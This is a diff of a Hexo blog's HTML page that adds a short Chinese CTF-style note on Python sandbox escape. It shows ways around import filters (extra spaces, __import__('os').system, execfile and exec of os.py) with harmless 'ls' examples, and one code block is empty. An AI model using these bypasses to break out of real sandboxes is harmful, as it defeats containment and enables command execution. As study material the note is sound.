@@ -260,6 +260,145 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/11/python沙盒逃逸one/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/11/python沙盒逃逸one/" itemprop="url">python沙盒逃逸one</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-11T21:36:13+08:00">
+                2019-09-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>第一篇主要学习导入import的方式</p>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>分隔符用多个空格</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span>  os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span>   os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span>   sys</span><br></pre></td></tr></table></figure>
+
+<h2 id="同义词绕过"><a href="#同义词绕过" class="headerlink" title="同义词绕过"></a>同义词绕过</h2><h3 id="import"><a href="#import" class="headerlink" title="_import_"></a>_<em>import_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">'os'</span>)</span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line">公共  图片  音乐	core   hash_extender  pick.py	 static</span><br></pre></td></tr></table></figure>
+
+<h3 id="importlib"><a href="#importlib" class="headerlink" title="_importlib_"></a>_<em>importlib_</em></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="execfile"><a href="#execfile" class="headerlink" title="execfile"></a>execfile</h3><p>python导入库，实际上就是执行一次库文件(2.x版本可用，3.x版本删除execfile)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br><span class="line">&gt;&gt;&gt; system(&apos;ls&apos;)</span><br><span class="line">公共  图片  音乐	core   hash_extender  pick.py	 static</span><br></pre></td></tr></table></figure>
+
+<p>2.x 3.x 通用的方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'/usr/lib/python3.6/os.py'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exec(f.read())</span><br><span class="line">system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python3 11.py </span></span><br><span class="line">11.py  视频</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看路径"><a href="#查看路径" class="headerlink" title="查看路径"></a>查看路径</h3><p>针对上面需要路径的，大都是默认路径，如果sys没被干掉可以使用sys.path看一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> sys.path</span><br><span class="line">[<span class="string">''</span>, <span class="string">'/usr/lib/python2.7'</span>,</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/11/ctf中的mysql注入总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -875,7 +1014,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-count">5</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
